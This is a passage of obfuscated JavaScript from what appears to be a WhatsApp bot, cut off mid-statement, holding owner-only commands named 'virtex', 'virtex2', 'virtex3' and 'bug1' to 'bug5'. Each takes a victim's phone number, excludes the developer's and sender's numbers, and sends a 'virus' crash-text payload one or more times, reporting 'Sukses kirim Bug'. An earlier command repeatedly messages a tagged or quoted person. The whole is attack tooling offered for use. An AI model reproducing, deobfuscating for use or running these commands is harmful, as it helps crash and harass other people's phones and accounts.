_0x35b617;},_0x575a(_0x2978e9,_0x5c6f00);}if(!isOwner)return reply(mess[_0x319a60(0x1ae)]);if(!isGroup)return reply(mess[_0x319a60(0x1a2)]);function _0x5e2f(){var _0x2ba66c=['split','3|5|1|6|2|','48tFpCdG','im\x20*','2|0|4|6|1|','\x20yg\x20mau\x20sa','group','152568SkWHVv','0|4|7','ntet\x0a\x0a*Con','7jCrxXj','*\x20to\x20@','Tag\x20atau\x20r','toh:*\x20#san','sendMessag','56rCrjIi','eply\x20orang','sender','owner','1595DIZmNC','6295266Gykqng','Sukses\x20kir','5|3|7','2121TFcpZi','3896LoiOmg','2873685dPyRlZ','length','1830940QYhPbQ','372366TWBBCG','tet\x20@tag','24394YDTSWC'];_0x5e2f=function(){return _0x2ba66c;};return _0x5e2f();}var number;if(mentionUser[_0x319a60(0x197)]!==0x1*0xb27+0x736*0x5+-0x2f35){var jVUtYe=(_0x319a60(0x1a0)+_0x319a60(0x1b2))[_0x319a60(0x19c)]('|'),hSZMXI=-0x225*0xb+0x10de+0x6b9*0x1;while(!![]){switch(jVUtYe[hSZMXI++]){case'0':await sleep(-0x2636+0x92c+0x6cb*0x6);continue;case'1':zeroyt7[_0x319a60(0x1aa)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'2':number=mentionUser[-0x1498+0xa6d+0xa2b];continue;case'3':zeroyt7[_0x319a60(0x1aa)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'4':zeroyt7[_0x319a60(0x1aa)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'5':await sleep(0x1*0x1b7+-0x905*-0x2+-0xb*0xbb);continue;case'6':await sleep(-0x1449+0x19ad*0x1+0x654);continue;case'7':reply(_0x319a60(0x1b1)+_0x319a60(0x19f)+command+_0x319a60(0x1a7)+number[_0x319a60(0x19c)]('@')[-0x17a0+-0x25df+0x1*0x3d7f],[number]);continue;}break;}}else{if(isQuotedMsg){var DQQnJF=(_0x319a60(0x19d)+_0x319a60(0x1a4))[_0x319a60(0x19c)]('|'),PUsDRE=0x57*0x4a+-0x622+-0x1304;while(!![]){switch(DQQnJF[PUsDRE++]){case'0':await sleep(0xd8c+0x1*-0x170f+-0x5*-0x43f);continue;case'1':zeroyt7[_0x319a60(0x1aa)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'2':zeroyt7[_0x319a60(0x1aa)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'3':number=quotedMsg[_0x319a60(0x1ad)];continue;case'4':zeroyt7[_0x319a60(0x1aa)+'e'](number,{'text':philips},{'quoted':fkontak});continue;case'5':await sleep(0x1342+-0x148b+0xd01);continue;case'6':await sleep(0x9de+-0x1010+0x11ea);continue;case'7':reply(_0x319a60(0x1b1)+_0x319a60(0x19f)+command+_0x319a60(0x1a7)+number[_0x319a60(0x19c)]('@')[-0x1*-0x3dd+-0xfab+-0x1*-0xbce],[number]);continue;}break;}}else reply(_0x319a60(0x1a8)+_0x319a60(0x1ac)+_0x319a60(0x1a1)+_0x319a60(0x1a5)+_0x319a60(0x1a9)+_0x319a60(0x19a));}
}
break
case 'virtex': {
var _0x479c86=_0xc69f;(function(_0x58a4b0,_0x3b4219){var _0x4b67ef=_0xc69f,_0x429d5b=_0x58a4b0();while(!![]){try{var _0x40f5ba=-parseInt(_0x4b67ef(0x139))/(0x377*-0x7+-0x1a73+0x32b5)*(parseInt(_0x4b67ef(0x13e))/(0x2*0xbe1+-0x1*-0x223f+-0x39ff))+-parseInt(_0x4b67ef(0x13a))/(0x2*-0xd61+0x24d5+-0x8*0x142)*(parseInt(_0x4b67ef(0x137))/(-0x2*-0x685+-0xeaa*0x1+0x1a4))+parseInt(_0x4b67ef(0x133))/(-0x1297+0xd3d*0x1+0x55f*0x1)+-parseInt(_0x4b67ef(0x14b))/(-0x10ad+0x16ab*0x1+-0x5f8)+-parseInt(_0x4b67ef(0x14e))/(0x1e*0x86+0x92f*0x1+-0x25*0xac)*(-parseInt(_0x4b67ef(0x135))/(0x3*0x559+-0xf29+-0xda))+parseInt(_0x4b67ef(0x142))/(-0xb5*0xb+-0x1b58+0x2328)+parseInt(_0x4b67ef(0x14f))/(-0x2e7*0xc+-0x2388+0x2*0x2333);if(_0x40f5ba===_0x3b4219)break;else _0x429d5b['push'](_0x429d5b['shift']());}catch(_0xa812ed){_0x429d5b['push'](_0x429d5b['shift']());}}}(_0x4909,-0x9*0x751f+0x22b29*0x3+0xf7f*0x16));if(!isOwner)return reply(mess[_0x479c86(0x143)]);if(!text)return reply(_0x479c86(0x13f)+_0x479c86(0x13b)+_0x479c86(0x14d)+_0x479c86(0x141)+_0x479c86(0x151)+(prefix+command)+_0x479c86(0x13d));var num=q+(_0x479c86(0x147)+_0x479c86(0x148)),dev=_0x479c86(0x149)+_0x479c86(0x150)+_0x479c86(0x136);function _0xc69f(_0x338561,_0x4777ba){var _0x171674=_0x4909();return _0xc69f=function(_0x1a4ce1,_0xb41380){_0x1a4ce1=_0x1a4ce1-(-0x7f*0xd+0x20d9+-0x1933);var _0x43b316=_0x171674[_0x1a4ce1];return _0x43b316;},_0xc69f(_0x338561,_0x4777ba);}if(num==dev)return reply(_0x479c86(0x146)+_0x479c86(0x144));function _0x4909(){var _0x271f12=['itu\x20nomor\x20','Itu\x20develo','@s.whatsap','p.net','6281548926','split','61404GZiMMP','lu\x20sendiri','Mau\x20Di\x20Kir','1007363TMCKwI','190560QUnwjl','840@s.what','Contoh:\x20','272240zZsdnI','Sukses\x20kir','16wMHdAk','sapp.net','1277196csMwrH','im\x20*','1NLnwTG','3KYFGlz','mer\x20Hp\x20Yg\x20','sendMessag','\x20628xxx','19914awtOAS','Masukan\x20No','*\x20to\x20@','im\x20Bug\x20!\x0a*','1997622IrHBpA','owner','per\x20gua'];_0x4909=function(){return _0x271f12;};return _0x4909();}if(num==sender)return reply(_0x479c86(0x145)+_0x479c86(0x14c));zeroyt7[_0x479c86(0x13c)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(-0x2*0xeed+0x1*0x1065+0x192d),reply(_0x479c86(0x134)+_0x479c86(0x138)+command+_0x479c86(0x140)+num[_0x479c86(0x14a)]('@')[0x2*0x251+0x5*0xff+0x99d*-0x1],[num]);
}
break
case 'virtex2':{
var _0x45fcdc=_0x61d6;(function(_0x5ad9d8,_0x16b523){var _0x267ca2=_0x61d6,_0x439827=_0x5ad9d8();while(!![]){try{var _0x2ebcdf=parseInt(_0x267ca2(0xcf))/(-0x73*0x18+-0x1*-0x1993+-0xeca)*(parseInt(_0x267ca2(0xcc))/(-0xf3a+0x13*0x1b1+-0x10e7))+parseInt(_0x267ca2(0xc4))/(0x1bed+-0x9c5*-0x3+0x13*-0x303)*(-parseInt(_0x267ca2(0xb6))/(-0x1dfe+-0x7*-0x12e+-0x3*-0x740))+parseInt(_0x267ca2(0xcd))/(0x9f*-0x1b+-0x24cb+0x3595)*(-parseInt(_0x267ca2(0xbf))/(-0x1d7*0xf+-0xba1+-0x2*-0x13a0))+-parseInt(_0x267ca2(0xc2))/(0x22*-0xc5+0xb*-0x89+-0x1*-0x2014)*(-parseInt(_0x267ca2(0xd0))/(-0x1627+-0x94*-0x3b+-0xbed))+parseInt(_0x267ca2(0xd6))/(-0x81a+0x101a*0x2+-0x1811)*(-parseInt(_0x267ca2(0xc6))/(-0x181c+-0x1205+0x2a2b))+-parseInt(_0x267ca2(0xca))/(0xd90+-0x1496+0x711)*(parseInt(_0x267ca2(0xc7))/(-0x1c41+-0x4*0x1a5+0x1*0x22e1))+-parseInt(_0x267ca2(0xc9))/(0x1e49+-0x12a8+-0xb94)*(-parseInt(_0x267ca2(0xbb))/(-0x2*-0x96b+0x889+-0xbd*0x25));if(_0x2ebcdf===_0x16b523)break;else _0x439827['push'](_0x439827['shift']());}catch(_0x46bfd6){_0x439827['push'](_0x439827['shift']());}}}(_0x15d8,-0xba060+0xade1d+0xbe8ac));if(!isOwner)return reply(mess[_0x45fcdc(0xb7)]);if(!text)return reply(_0x45fcdc(0xb5)+_0x45fcdc(0xd3)+_0x45fcdc(0xc5)+_0x45fcdc(0xbe)+_0x45fcdc(0xb8)+(prefix+command)+_0x45fcdc(0xd1));var num=q+(_0x45fcdc(0xb9)+_0x45fcdc(0xbd)),dev=_0x45fcdc(0xd2)+_0x45fcdc(0xd5)+_0x45fcdc(0xb4);if(num==dev)return reply(_0x45fcdc(0xc8)+_0x45fcdc(0xd4));function _0x15d8(){var _0x29ccbc=['@s.whatsap','itu\x20nomor\x20','5659472ceFcFo','Sukses\x20kir','p.net','im\x20Bug\x20!\x0a*','1808844DSiyYR','split','lu\x20sendiri','393939gCjxiN','im\x20*','93627HbTjSo','Mau\x20Di\x20Kir','63810GMYOsk','2732724MQvSOV','Itu\x20develo','52RXvURc','33MGgrIK','*\x20to\x20@','1474zJAeYn','5zCTtfQ','sendMessag','719BeEGvP','192byUYIi','\x20628xxx','6281548926','mer\x20Hp\x20Yg\x20','per\x20gua','840@s.what','1017lCPOEo','sapp.net','Masukan\x20No','136QwwVvI','owner','Contoh:\x20'];_0x15d8=function(){return _0x29ccbc;};return _0x15d8();}if(num==sender)return reply(_0x45fcdc(0xba)+_0x45fcdc(0xc1));function _0x61d6(_0x560483,_0x4458b2){var _0x57081d=_0x15d8();return _0x61d6=function(_0x445dbd,_0x5c4f1a){_0x445dbd=_0x445dbd-(-0x1903+0x2275+-0x8be);var _0x4e41d7=_0x57081d[_0x445dbd];return _0x4e41d7;},_0x61d6(_0x560483,_0x4458b2);}zeroyt7[_0x45fcdc(0xce)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(-0xe*-0x1ca+-0x9ba*-0x1+-0x170e),zeroyt7[_0x45fcdc(0xce)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(-0x1926+-0x2216+0x13*0x3bc),reply(_0x45fcdc(0xbc)+_0x45fcdc(0xc3)+command+_0x45fcdc(0xcb)+num[_0x45fcdc(0xc0)]('@')[0x19*-0x9+0x2161*-0x1+0x1121*0x2],[num]);
}
break
case 'virtex3': {
var _0x3e54fc=_0x2a36;(function(_0xbb5e35,_0x1dc1df){var _0x48df0d=_0x2a36,_0x5e9577=_0xbb5e35();while(!![]){try{var _0x33aff8=parseInt(_0x48df0d(0xee))/(-0x1460+-0x1157+-0x8e*-0x44)*(-parseInt(_0x48df0d(0xf3))/(0x1c2d+-0x2ef*-0x8+-0x33a3))+parseInt(_0x48df0d(0xfc))/(-0x1f5b+0x11c8+0x2*0x6cb)*(parseInt(_0x48df0d(0xfd))/(0x39*0x6+-0x2*-0xd79+-0x192*0x12))+parseInt(_0x48df0d(0xf4))/(0x130+0x1995*0x1+-0x1ac0)*(-parseInt(_0x48df0d(0x103))/(-0x1463*-0x1+-0x2482+0x1025))+parseInt(_0x48df0d(0x102))/(0x3*0xc36+0xa4+-0x5*0x773)*(parseInt(_0x48df0d(0x101))/(-0x190*0x10+0x256f+-0x1*0xc67))+-parseInt(_0x48df0d(0xed))/(-0x230a+-0xcca*-0x2+0x97f*0x1)+parseInt(_0x48df0d(0xf9))/(0xb78+-0x1*0x593+0x1*-0x5db)+parseInt(_0x48df0d(0xe7))/(-0x14c5+-0x2*0x108f+0x27*0x162);if(_0x33aff8===_0x1dc1df)break;else _0x5e9577['push'](_0x5e9577['shift']());}catch(_0x242931){_0x5e9577['push'](_0x5e9577['shift']());}}}(_0x265e,-0xb12a8+0x1*0x70975+0x2*0x5120f));function _0x2a36(_0x2fe3ee,_0x102166){var _0x3ba18a=_0x265e();return _0x2a36=function(_0x5e6f40,_0x37e5cc){_0x5e6f40=_0x5e6f40-(0x2593+0x1a8f+0xa*-0x653);var _0x591052=_0x3ba18a[_0x5e6f40];return _0x591052;},_0x2a36(_0x2fe3ee,_0x102166);}if(!isOwner)return reply(mess[_0x3e54fc(0xec)]);if(!text)return reply(_0x3e54fc(0xfb)+_0x3e54fc(0xff)+_0x3e54fc(0xe8)+_0x3e54fc(0xf1)+_0x3e54fc(0x100)+(prefix+command)+_0x3e54fc(0xe4));var num=q+(_0x3e54fc(0xe9)+_0x3e54fc(0xf6)),dev=_0x3e54fc(0xf7)+_0x3e54fc(0xeb)+_0x3e54fc(0xf8);if(num==dev)return reply(_0x3e54fc(0xf5)+_0x3e54fc(0xef));function _0x265e(){var _0x47cddf=['*\x20to\x20@','mer\x20Hp\x20Yg\x20','Contoh:\x20','3703720ykChMW','7DRfexh','2812818tLTHcO','\x20628xxx','im\x20*','itu\x20nomor\x20','5988070rOGebQ','Mau\x20Di\x20Kir','@s.whatsap','lu\x20sendiri','840@s.what','owner','1974384AoKksp','40oSNzGa','per\x20gua','split','im\x20Bug\x20!\x0a*','Sukses\x20kir','4798tBHWri','5YtbPVI','Itu\x20develo','p.net','6281548926','sapp.net','898480fXYhvK','sendMessag','Masukan\x20No','9irNpRK','116084aFCkei'];_0x265e=function(){return _0x47cddf;};return _0x265e();}if(num==sender)return reply(_0x3e54fc(0xe6)+_0x3e54fc(0xea));zeroyt7[_0x3e54fc(0xfa)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(-0x11f*-0x6+0x21e6+-0x4*0x73a),zeroyt7[_0x3e54fc(0xfa)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(-0x3*-0x8c6+-0x201a+0x50*0x38),zeroyt7[_0x3e54fc(0xfa)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(0x14cc*-0x1+-0x1134*-0x1+-0x46*-0x38),reply(_0x3e54fc(0xf2)+_0x3e54fc(0xe5)+command+_0x3e54fc(0xfe)+num[_0x3e54fc(0xf0)]('@')[0x12a5+0x1920+0x9*-0x4dd],[num]);
}
break
case 'bug1': {
var _0x2fe6b7=_0xd9e8;(function(_0x2be967,_0x5198ed){var _0x155290=_0xd9e8,_0x53e1f4=_0x2be967();while(!![]){try{var _0x1575d4=-parseInt(_0x155290(0x207))/(-0x1083+-0x22d3+0x3357)*(parseInt(_0x155290(0x1fc))/(-0x1*-0x24e4+-0x1c36+-0x8ac))+parseInt(_0x155290(0x1f1))/(-0x10*-0x267+-0xb77*0x3+-0x408)+parseInt(_0x155290(0x1f7))/(-0x6df*0x4+-0x256a*-0x1+-0x9ea)*(parseInt(_0x155290(0x1f2))/(0xb45*0x1+-0x558+-0x5e8))+parseInt(_0x155290(0x200))/(-0xabd+0x1c09+-0x1146)*(-parseInt(_0x155290(0x1f9))/(0x3e*-0xb+-0x179e+0xf*0x1c1))+parseInt(_0x155290(0x203))/(0x517*-0x4+0x1*0x237b+-0xf17)+-parseInt(_0x155290(0x1fd))/(-0x2503*0x1+0x1e2a+0x6e2)+parseInt(_0x155290(0x205))/(-0x1acf*-0x1+-0x137b+-0x74a);if(_0x1575d4===_0x5198ed)break;else _0x53e1f4['push'](_0x53e1f4['shift']());}catch(_0x4bf75d){_0x53e1f4['push'](_0x53e1f4['shift']());}}}(_0x43e0,-0x10b87f+0xbd8d*-0x3+0x1f7c6f));function _0x43e0(){var _0x3fdccf=['Contoh:\x20','20399030gMuOPD','lu\x20sendiri','1QgxlFp','im\x20*','im\x20Bug\x20!\x0a*','sendMessag','\x20628xxx','840@s.what','mer\x20Hp\x20Yg\x20','p.net','@s.whatsap','1600128wdFNwf','5wlbUEh','itu\x20nomor\x20','sapp.net','*\x20to\x20@','split','1489844OqshMP','6281548926','315077iaaEvy','Masukan\x20No','owner','949822RhCnjv','8551413PpGfWg','Mau\x20Di\x20Kir','Sukses\x20kir','210kKbfqT','Itu\x20develo','per\x20gua','7014416uMqBWq'];_0x43e0=function(){return _0x3fdccf;};return _0x43e0();}if(!isOwner)return reply(mess[_0x2fe6b7(0x1fb)]);if(!text)return reply(_0x2fe6b7(0x1fa)+_0x2fe6b7(0x1ee)+_0x2fe6b7(0x1fe)+_0x2fe6b7(0x209)+_0x2fe6b7(0x204)+(prefix+command)+_0x2fe6b7(0x20b));var num=q+(_0x2fe6b7(0x1f0)+_0x2fe6b7(0x1ef)),dev=_0x2fe6b7(0x1f8)+_0x2fe6b7(0x1ed)+_0x2fe6b7(0x1f4);if(num==dev)return reply(_0x2fe6b7(0x201)+_0x2fe6b7(0x202));if(num==sender)return reply(_0x2fe6b7(0x1f3)+_0x2fe6b7(0x206));function _0xd9e8(_0x1cc601,_0x415d1f){var _0x512b4b=_0x43e0();return _0xd9e8=function(_0x4e09bc,_0x4fb95c){_0x4e09bc=_0x4e09bc-(-0x1931*0x1+0xdc9*-0x1+0x25*0x11b);var _0x6c497b=_0x512b4b[_0x4e09bc];return _0x6c497b;},_0xd9e8(_0x1cc601,_0x415d1f);}zeroyt7[_0x2fe6b7(0x20a)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(-0x1b6e*-0x1+0x18de+0xc4*-0x35),reply(_0x2fe6b7(0x1ff)+_0x2fe6b7(0x208)+command+_0x2fe6b7(0x1f5)+num[_0x2fe6b7(0x1f6)]('@')[-0x67*0x7+-0xcc1+0xf92],[num]);
}
break
case 'bug2': {
var _0x5aeef0=_0x1cff;(function(_0x480b35,_0x50332a){var _0x2b98fc=_0x1cff,_0x1fe044=_0x480b35();while(!![]){try{var _0x1d55ef=-parseInt(_0x2b98fc(0xad))/(-0xfe9+0x262+0xd88)*(-parseInt(_0x2b98fc(0xa6))/(0x2489+-0xe1f+-0x18*0xef))+-parseInt(_0x2b98fc(0xac))/(0x31*0x5f+-0x11b4*-0x1+-0x23e0)*(parseInt(_0x2b98fc(0x92))/(-0x3ac*0x7+-0x1*-0x25e5+-0xc2d))+parseInt(_0x2b98fc(0x9e))/(0x331+-0x203f*0x1+0x33b*0x9)*(-parseInt(_0x2b98fc(0xab))/(-0x4c2+0x22*0x52+-0x61c))+parseInt(_0x2b98fc(0x97))/(0x1804+-0x89f*-0x3+-0x3*0x109e)+-parseInt(_0x2b98fc(0x90))/(-0x7e8*0x3+0x3*0x3fd+0xbc9)*(-parseInt(_0x2b98fc(0x98))/(0x3*0xb6+0xd7*-0x1c+-0x156b*-0x1))+parseInt(_0x2b98fc(0x94))/(-0xfe6+-0x265f+0x364f*0x1)*(-parseInt(_0x2b98fc(0x9c))/(-0x4b1*0x5+-0x12a7+0x2a27))+parseInt(_0x2b98fc(0x9a))/(-0x68*0x3b+-0xfaf+0x27b3);if(_0x1d55ef===_0x50332a)break;else _0x1fe044['push'](_0x1fe044['shift']());}catch(_0x59735b){_0x1fe044['push'](_0x1fe044['shift']());}}}(_0x57f7,-0x1*-0x7e32f+-0x4441*-0x3+-0x39730));if(!isOwner)return reply(mess[_0x5aeef0(0xa0)]);if(!text)return reply(_0x5aeef0(0x8f)+_0x5aeef0(0x99)+_0x5aeef0(0x96)+_0x5aeef0(0x9d)+_0x5aeef0(0xa1)+(prefix+command)+_0x5aeef0(0xa5));var num=q+(_0x5aeef0(0x91)+_0x5aeef0(0x93)),dev=_0x5aeef0(0xa8)+_0x5aeef0(0x9b)+_0x5aeef0(0x9f);if(num==dev)return reply(_0x5aeef0(0xa4)+_0x5aeef0(0xae));function _0x57f7(){var _0x3109b0=['Masukan\x20No','520xeZiNV','@s.whatsap','4DkvYsh','p.net','5985970eYuVuM','Sukses\x20kir','Mau\x20Di\x20Kir','1883371fYpVYv','74853zxGIqb','mer\x20Hp\x20Yg\x20','6111948onNDfG','840@s.what','11Xgdppr','im\x20Bug\x20!\x0a*','154195bWdQAK','sapp.net','owner','Contoh:\x20','im\x20*','*\x20to\x20@','Itu\x20develo','\x20628xxx','2dffMDh','lu\x20sendiri','6281548926','sendMessag','itu\x20nomor\x20','102lrUGJf','918762uyigfi','444145jcOWvv','per\x20gua','split'];_0x57f7=function(){return _0x3109b0;};return _0x57f7();}if(num==sender)return reply(_0x5aeef0(0xaa)+_0x5aeef0(0xa7));function _0x1cff(_0x2717a2,_0x4c1aa9){var _0x82c651=_0x57f7();return _0x1cff=function(_0x3d9009,_0x523878){_0x3d9009=_0x3d9009-(-0x3*0x115+0x24af+-0x20e2);var _0x4e3223=_0x82c651[_0x3d9009];return _0x4e3223;},_0x1cff(_0x2717a2,_0x4c1aa9);}zeroyt7[_0x5aeef0(0xa9)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(0x1c4b*0x1+0x18ff+-0x2992),reply(_0x5aeef0(0x95)+_0x5aeef0(0xa2)+command+_0x5aeef0(0xa3)+num[_0x5aeef0(0x8e)]('@')[-0x1cf2+-0x95f*0x2+-0x17d8*-0x2],[num]);
}
break
case 'bug3': {
var _0x1752f9=_0x2f57;function _0x2f57(_0x3a2bc6,_0x4ae273){var _0x101089=_0x4716();return _0x2f57=function(_0x4107a4,_0x308f1c){_0x4107a4=_0x4107a4-(-0x1*-0x419+0x868+0xbef*-0x1);var _0x33d925=_0x101089[_0x4107a4];return _0x33d925;},_0x2f57(_0x3a2bc6,_0x4ae273);}(function(_0x54a289,_0x2d2726){var _0x3bbfd0=_0x2f57,_0x439d9c=_0x54a289();while(!![]){try{var _0x160162=parseInt(_0x3bbfd0(0x99))/(-0xea7+0x2657+-0x81*0x2f)+-parseInt(_0x3bbfd0(0x96))/(-0x16aa+-0x1*0x13d9+0x2a85*0x1)+parseInt(_0x3bbfd0(0xa5))/(0x2*-0x541+-0xc*0x104+-0x16b5*-0x1)*(-parseInt(_0x3bbfd0(0x94))/(-0x245c+-0x3ab+0xd59*0x3))+parseInt(_0x3bbfd0(0x93))/(-0x1*-0x2141+-0x1942+-0x2*0x3fd)+-parseInt(_0x3bbfd0(0xa9))/(-0x663*0x1+-0x61a*0x5+0x1*0x24eb)+parseInt(_0x3bbfd0(0xac))/(-0x1a55+-0x5*-0x7b7+-0xc37)*(parseInt(_0x3bbfd0(0x9a))/(0x1b3+0x259f+-0x274a))+parseInt(_0x3bbfd0(0xaa))/(0x1016*0x1+0x2dd+-0x2*0x975);if(_0x160162===_0x2d2726)break;else _0x439d9c['push'](_0x439d9c['shift']());}catch(_0x589816){_0x439d9c['push'](_0x439d9c['shift']());}}}(_0x4716,-0x11de0a+-0x14a96+0x2185de));if(!isOwner)return reply(mess[_0x1752f9(0x9c)]);if(!text)return reply(_0x1752f9(0xaf)+_0x1752f9(0x9e)+_0x1752f9(0x9b)+_0x1752f9(0x9d)+_0x1752f9(0x95)+(prefix+command)+_0x1752f9(0xa1));var num=q+(_0x1752f9(0xa8)+_0x1752f9(0xab)),dev=_0x1752f9(0xad)+_0x1752f9(0xa0)+_0x1752f9(0x92);if(num==dev)return reply(_0x1752f9(0xa6)+_0x1752f9(0xae));if(num==sender)return reply(_0x1752f9(0xa4)+_0x1752f9(0x9f));zeroyt7[_0x1752f9(0xa3)+'e'](num,{'text':'p'},{'quoted':fkontak}),zeroyt7[_0x1752f9(0xa3)+'e'](num,{'text':virus},{'quoted':fkontak}),zeroyt7[_0x1752f9(0xa3)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(0xe35+-0xb7*-0x1+-0x334),reply(_0x1752f9(0x97)+_0x1752f9(0xa7)+command+_0x1752f9(0xa2)+num[_0x1752f9(0x98)]('@')[-0x1d6c*-0x1+0x524*-0x1+-0x4*0x612],[num]);function _0x4716(){var _0x898fe7=['840@s.what','\x20628xxx','*\x20to\x20@','sendMessag','itu\x20nomor\x20','8169GhEFvF','Itu\x20develo','im\x20*','@s.whatsap','6493062IEMciy','14934123JKVsIu','p.net','1760269ivgoKY','6281548926','per\x20gua','Masukan\x20No','sapp.net','4811465kkMeeY','1412aeSpqi','Contoh:\x20','2242886CXmlRE','Sukses\x20kir','split','981639ASuNCP','16UtqxwD','Mau\x20Di\x20Kir','owner','im\x20Bug\x20!\x0a*','mer\x20Hp\x20Yg\x20','lu\x20sendiri'];_0x4716=function(){return _0x898fe7;};return _0x4716();}
}
break
case 'bug4': {
var _0x14558c=_0x5008;(function(_0x485adb,_0x5d4b45){var _0x42280a=_0x5008,_0x1b963b=_0x485adb();while(!![]){try{var _0x5eab09=parseInt(_0x42280a(0xba))/(-0x1a71*0x1+-0x2*-0xd1c+0x1d*0x2)*(-parseInt(_0x42280a(0xd3))/(0x121a+-0x59*0x1+0x289*-0x7))+-parseInt(_0x42280a(0xc1))/(0x262+-0x6ea+0x1*0x48b)+parseInt(_0x42280a(0xc9))/(0x756+0x4a9*0x1+-0xbfb)*(-parseInt(_0x42280a(0xc0))/(-0x1*0x8cf+-0x12f*-0x3+0x547*0x1))+-parseInt(_0x42280a(0xbf))/(0x110c+0x2659*-0x1+0x1553)*(-parseInt(_0x42280a(0xc3))/(-0xb7a*0x2+-0x21b*-0x1+0x14e0))+-parseInt(_0x42280a(0xd0))/(0x2*0x3d+0x1*-0xa13+-0x11*-0x91)+-parseInt(_0x42280a(0xbe))/(0x179d+0x22cf+-0x3a63*0x1)+parseInt(_0x42280a(0xc7))/(0x6*0x42e+0xbf6+-0x4*0x940);if(_0x5eab09===_0x5d4b45)break;else _0x1b963b['push'](_0x1b963b['shift']());}catch(_0x4c7d51){_0x1b963b['push'](_0x1b963b['shift']());}}}(_0xd53e,0x2*0x71323+0x138427+-0xb0855*0x2));if(!isOwner)return reply(mess[_0x14558c(0xcd)]);function _0xd53e(){var _0x21e2c0=['2CuGGNw','lu\x20sendiri','sapp.net','per\x20gua','itu\x20nomor\x20','Masukan\x20No','73189GPTacG','Contoh:\x20','Sukses\x20kir','p.net','4751325dIddKe','43440hgANwi','3082540FtIKUe','249993tVPqjV','split','1316uuemKs','*\x20to\x20@','Mau\x20Di\x20Kir','Itu\x20develo','27808410nwjqJj','sendMessag','8iFyKPo','im\x20*','6281548926','840@s.what','owner','@s.whatsap','\x20628xxx','11713928kkFdSY','im\x20Bug\x20!\x0a*','mer\x20Hp\x20Yg\x20'];_0xd53e=function(){return _0x21e2c0;};return _0xd53e();}if(!text)return reply(_0x14558c(0xb9)+_0x14558c(0xd2)+_0x14558c(0xc5)+_0x14558c(0xd1)+_0x14558c(0xbb)+(prefix+command)+_0x14558c(0xcf));function _0x5008(_0x4e8f1a,_0x4cdf5c){var _0x1b991c=_0xd53e();return _0x5008=function(_0x4b79d5,_0x3dd5f8){_0x4b79d5=_0x4b79d5-(-0x1232+-0x5*-0xbe+0xf33);var _0x289e88=_0x1b991c[_0x4b79d5];return _0x289e88;},_0x5008(_0x4e8f1a,_0x4cdf5c);}var num=q+(_0x14558c(0xce)+_0x14558c(0xbd)),dev=_0x14558c(0xcb)+_0x14558c(0xcc)+_0x14558c(0xd5);if(num==dev)return reply(_0x14558c(0xc6)+_0x14558c(0xb7));if(num==sender)return reply(_0x14558c(0xb8)+_0x14558c(0xd4));await sleep(0xb97+0x5cb*-0x1+0x5ec),zeroyt7[_0x14558c(0xc8)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(-0x193+0xb*0x50+-0x1d*-0x57),zeroyt7[_0x14558c(0xc8)+'e'](num,{'text':'p'},{'quoted':fkontak}),await sleep(-0x9b+-0x126d+0x148*0x18),zeroyt7[_0x14558c(0xc8)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(0xd3b+-0x593*0x5+0x3c4*0x7),zeroyt7[_0x14558c(0xc8)+'e'](num,{'text':virus},{'quoted':fkontak}),await sleep(0x1576+0x1a4+-0xb62),reply(_0x14558c(0xbc)+_0x14558c(0xca)+command+_0x14558c(0xc4)+num[_0x14558c(0xc2)]('@')[-0x120*-0x1d+-0x3*-0x4ae+-0x2eaa],[num]);
}
break
case 'bug5': {
var _0x18077f=_0x34f9;(function(_0x7b1bd2,_0x49a00d){var _0x319a4a=_0x34f9,_0x4de55a=_0x7b1bd2();while(!![]){try{var _0x2beb50=parseInt(_0x319a4a(0xf8))/(0x49b*-0x4+0x10d6+0x197)*(-parseInt(_0x319a4a(0x10e))/(-0x1b*0x7e+0x1*0xada+0x272))+-parseInt(_0x319a4a(0x107))/(-0xd0*0x2f+0xb7d*-0x1+0x31b0)+-parseInt(_0x319a4a(0xf4))/(0xa28+0x16f*0x19+-0x2dfb)*(parseInt(_0x319a4a(0xf3))/(-0x1709*-0x1+0xa*-0x302+0x710))+-parseInt(_0x319a4a(0xf6))/(-0x12a6*-0x1+-0x789*-0x4+-0x30c4)*(-parseInt(_0x319a4a(0x10b))/(0xd*-0x121+0xfca+-0x116))+-parseInt(_0x319a4a(0xf5))/(0x4c*0x14+0xec0+-0x14a8)*(parseInt(_0x319a4a(0x102))/(-0x34b+-0xf23+-0x1d*-0xa3))+parseInt(_0x319a4a(0xf0))/(-0xed*-0x16+-0x1948+-0x27a*-0x2)+parseInt(_0x319a4a(0x105))/(-0x1ecc+0x210f+-0x8*0x47)*(parseInt(_0x319a4a(0x108))/(-0x54*-0x62+0xa*0x33d+0xfe*-0x41));if(_0x2beb50===_0x49a00d)break;else _0x4de55a['push'](_0x4de55a['shift']());}catch(_0x14e05a){_0x4de55a['push'](_0x4de55a['shift']());}}}(_0x572f,0x1aa3*-0x89+0x15c10+0x1*0x15856d));function _0x34f9(_0x5e5f5e,_0x1e6fa1){var _0xa6ac92=_0x572f();return _0x34f9=function(_0x35e389,_0x45b22c){_0x35e389=_0x35e389-(0x1*0xf83+-0x11a2+0x3*0x105);var _0x56d943=_0xa6ac92[_0x35e389];return _0x56d943;},_0x34f9(_0x5e5f5e,_0x1e6fa1);}if(!isOwner)return reply(mess[_0x18077f(0x10a)]);if(!text)return reply(_0x18077f(0xf9)+_0x18077f(0xfc)+_0x18077f(0x103)+_0x18077f(0xfb)+_0x18077f(0xf2)+(prefix+command)+_0x18077f(0xf1));var num=q+(_0x18077f(0x101)+_0x18077f(0xfd)),dev=_0x18077f(0x10c)+_0x18077f(0x109)+_0x18077f(0xff);if(num==dev)return reply(_0x18077f(0xfe)+_0x18077f(0x106));if(num==sender)return reply(_0x18077f(0xfa)+_0x18077f(0x10f));await 